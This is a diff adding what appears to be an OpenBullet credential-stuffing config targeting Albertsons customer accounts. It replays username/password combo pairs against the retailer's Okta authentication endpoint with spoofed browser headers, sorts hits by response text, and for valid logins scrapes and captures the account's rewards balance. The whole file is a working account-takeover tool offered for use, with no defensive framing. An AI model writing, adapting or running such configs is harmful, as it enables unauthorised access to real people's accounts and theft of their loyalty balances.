@@ -1,0 +1,94 @@
+[SETTINGS]
+{
+  "Name": "Albertsons",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-27T00:11:32.0013777-04:00",
+  "AdditionalInfo": "",
+  "Author": "Aaron Kong | Privileged Owner#1680",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST OPTIONS "https://albertsons.okta.com/api/v1/authn" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<COOKIES(JSESSIONID)>" LR "" "" -> VAR "JSESSIONID" 
+
+REQUEST POST "https://albertsons.okta.com/api/v1/authn" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: albertsons.okta.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 60" 
+  HEADER "X-Okta-User-Agent-Extended: okta-auth-js-1.15.0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36" 
+  HEADER "Accept: application/json" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "DNT: 1" 
+  HEADER "Origin: https://www.albertsons.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.albertsons.com/account/sign-in.html" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: JSESSIONID=<JSESSIONID>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"errorCode\":\"" 
+  KEYCHAIN Success OR 
+    KEY "{\"expiresAt\":\"" 
+
+REQUEST GET "https://www.albertsons.com/account/rewards.html" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "id=\"rewards-balance\">" "</span>" CreateEmpty=FALSE -> CAP "Reward's Balance" 
+
